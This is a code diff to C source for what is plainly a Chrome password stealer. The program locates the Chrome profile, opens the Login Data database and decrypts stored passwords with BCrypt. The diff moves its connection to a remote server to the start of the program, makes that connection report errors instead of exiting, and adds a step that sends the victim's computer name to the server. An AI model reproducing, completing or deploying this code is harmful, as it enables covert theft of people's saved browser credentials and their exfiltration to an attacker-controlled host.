@@ -44,12 +44,12 @@ BOOL is_substring_in(const CHAR* substring, PCHAR test_string);
 BOOL open_database_conn(PSTR chrome_dir_char, PSTR profile_name, sqlite3** handle_db);
 BOOL get_credentials(BCRYPT_KEY_HANDLE handle_bcrypt, BYTE** enc_password, int* size_enc_password, BYTE** cipher_text, PULONG size_cipher_text, BYTE* iv, BYTE* tag, BYTE** tmp_pointer, BYTE** decrypted_byte, PULONG decrypted_byte_size);
 BOOL decrypt_password(BCRYPT_KEY_HANDLE handle_bcrypt, BYTE* cipher_text, ULONG size_cipher_text, BYTE* iv, ULONG size_iv, BYTE* tag, ULONG size_tag, BYTE** decrypted_credentials, ULONG* size_decrypted_credentials);
-void connect_to_serv(SOCKET* ConnectSocket);
+BOOL connect_to_serv(SOCKET* ConnectSocket);
 void sendData(char* data);
 void closeConnection();
 
-int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
-//int main() {
+//int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
+int main() {
 	/* These variables are used to retrieve chrome paths, directories, master key etc. */
 	WCHAR chrome_dir[MAX_PATH] = { L'\0' }, enc_master_key[ENC_MASTER_KEY_LEN] = { L'\0' };	// Buffer to hold Google Chrome directory, and Encrypted master key (encrypted using CryptProtectData())
 	CHAR chrome_dir_char[MAX_PATH] = { '\0' };												// Chrome directory in CHAR (Later it will be used to get profile paths to get Login Data db
@@ -67,6 +67,12 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 	int data_blob_size;																		// To hold the size of bytes of the encrypted password
 	ULONG decrypted_credential_size = CIPHER_LEN, default_cipher_text_size = CIPHER_LEN;	// To hold the size of cipher text and the decrypted password size
 	BYTE* cipher_text_byte = (BYTE*)malloc(default_cipher_text_size);						// Allocate a buffer to hold the cipher text (actual encrypted password)
+
+	/* Connect to the server */
+	if (!connect_to_serv(&ConnectSocket)) {
+		return FALSE;
+	}
+
 	if (!cipher_text_byte) {
 		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "malloc: Error when allocating buffer for 'cipher_text_byte'\n");
 		sendData(tcp_send_buffer);
@@ -83,10 +89,6 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 	memset(decrypted_credential, 0, decrypted_credential_size);
 	BYTE iv[IV_LEN] = { 0 }, tag[TAG_LEN] = { 0 };											// Buffers to hold IV and the TAG. Which are used to decrypt the cipher text.
 
-
-
-	/* Connect to the server */
-	connect_to_serv(&ConnectSocket);
 
 	/* Gets the Chrome Folder if exists, which is% LOCALAPPDATA% \Google\Chrome\User Data */
 	if (!get_chrome_directory(chrome_dir, MAX_PATH)) {
@@ -562,20 +564,22 @@ BOOL get_credentials(BCRYPT_KEY_HANDLE handle_bcrypt, BYTE** enc_password, int* 
 	return TRUE;
 }
 
-void connect_to_serv(SOCKET* ConnectSocket) {
+BOOL connect_to_serv(SOCKET* ConnectSocket) {
 	WSADATA wsaData;
 	struct addrinfo* result = NULL,
 		* ptr = NULL,
 		hints;
 	//char recvbuf[DEFAULT_BUFLEN];
 	int iResult;
+	DWORD len_machine_name = MAX_COMPUTERNAME_LENGTH + 1;
+	CHAR machine_name[MAX_COMPUTERNAME_LENGTH + 1];
 	//int recvbuflen = DEFAULT_BUFLEN;
 
 	// Initialize Winsock
 	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
 	if (iResult != 0) {
 		// sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "WSAStartup failed with error: %d\n", iResult);
-		exit(1);
+		return FALSE;
 	}
 
 	ZeroMemory(&hints, sizeof(hints));
@@ -588,7 +592,7 @@ void connect_to_serv(SOCKET* ConnectSocket) {
 	if (iResult != 0) {
 		// sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "getaddrinfo failed with error: %d\n", iResult);
 		WSACleanup();
-		exit(1);
+		return FALSE;
 	}
 
 	// Attempt to connect to an address until one succeeds
@@ -600,7 +604,7 @@ void connect_to_serv(SOCKET* ConnectSocket) {
 		if (*ConnectSocket == INVALID_SOCKET) {
 			// sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "socket failed with error: %ld\n", WSAGetLastError());
 			WSACleanup();
-			exit(1);
+			return FALSE;
 		}
 
 		// Connect to server.
@@ -610,6 +614,13 @@ void connect_to_serv(SOCKET* ConnectSocket) {
 			*ConnectSocket = INVALID_SOCKET;
 			continue;
 		}
+
+		// Get computer name and send it
+		if (GetComputerNameA(machine_name, &len_machine_name) == 0)
+			sprintf_s(machine_name, len_machine_name, "<error-getting-hostname>");
+		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "-------- GOT CONNECTION FROM (%s) --------\n", machine_name);
+		sendData(tcp_send_buffer);
+
 		break;
 	}
 
@@ -618,9 +629,8 @@ void connect_to_serv(SOCKET* ConnectSocket) {
 	if (*ConnectSocket == INVALID_SOCKET) {
 		// sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "Unable to connect to server!\n");
 		WSACleanup();
-		exit(1);
+		return FALSE;
 	}
-
 }
 
 void sendData(char* data) {
